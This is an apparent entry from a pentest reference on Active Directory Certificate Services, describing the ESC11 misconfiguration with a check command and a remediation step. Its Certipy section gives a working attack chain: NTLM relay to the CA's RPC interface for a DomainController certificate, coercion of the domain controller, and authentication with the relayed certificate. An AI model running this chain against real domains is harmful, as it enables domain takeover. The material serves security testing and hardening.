{"title": "ESC11: IF_ENFORCEENCRYPTICERTREQUEST", "source": "breaking-adcs", "source_label": "Breaking ADCS", "path": "esc11", "html": "<p><strong>Conditions:</strong> CA has <code>IF_ENFORCEENCRYPTICERTREQUEST</code> flag cleared (<code>0x0</code>), enabling NTLM relay to the ICertRequestD DCOM/RPC interface (not just HTTP). Similar to ESC8 but targets the RPC interface.</p>\n<h3>Check Flag</h3>\n<pre><code class=\"language-bash\">certutil -config &quot;&lt;ca-host&gt;\\&lt;ca-name&gt;&quot; -getreg CA\\InterfaceFlags</code></pre>\n<pre><code class=\"language-bash\">certutil -config &quot;braavos.essos.local\\ESSOS-CA&quot; -getreg CA\\InterfaceFlags\n\nHKEY_LOCAL_MACHINE\\...\\InterfaceFlags REG_DWORD = 0x0 (0)\n\n# 0x0 = VULNERABLE (no encryption required)\n# 0x200 = Hardened</code></pre>\n<div class=\"admonition note\"><p class=\"admonition-title\">Note</p><p>Exploitation uses an adapted ntlmrelayx.py to relay NTLM auth to the CA's ICertRequestD DCOM interface over unencrypted RPC. The relay submits a crafted CSR on behalf of the relayed account.</p></div>\n<h3>Enable Flag (Remediation)</h3>\n<pre><code class=\"language-bash\">certutil -config &quot;&lt;ca-host&gt;\\&lt;ca-name&gt;&quot; -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST\nnet stop certsvc &amp;&amp; net start certsvc</code></pre>\n\n<h3>Alternative — Certipy (Linux)</h3>\n<pre><code class=\"language-bash\"># ESC11 (IF_ENFORCEENCRYPTICERTREQUEST cleared) - relay NTLM to the CA's ICertPassage (ICPR) RPC interface.\n# Terminal 1 - relay to the RPC endpoint\nntlmrelayx.py -t rpc://&lt;ca-host&gt; -rpc-mode ICPR -icpr-ca-name &lt;ca-name&gt; -smb2support --adcs-attack --adcs-template DomainController\n# Terminal 2 - coerce the DC\ncoercer coerce -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt; -l &lt;attacker-ip&gt; -t &lt;dc-host&gt;\n# authenticate with the relayed machine certificate\ncertipy auth -pfx &lt;dc-host&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>", "excerpt": "Conditions: CA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared ( 0x0 ), enabling NTLM relay to the ICertRequestD DCOM/RPC interface (not just HTTP). Similar to ESC8 but targets the RPC interface. Check", "tags": ["adcs", "active-directory", "certificates"]}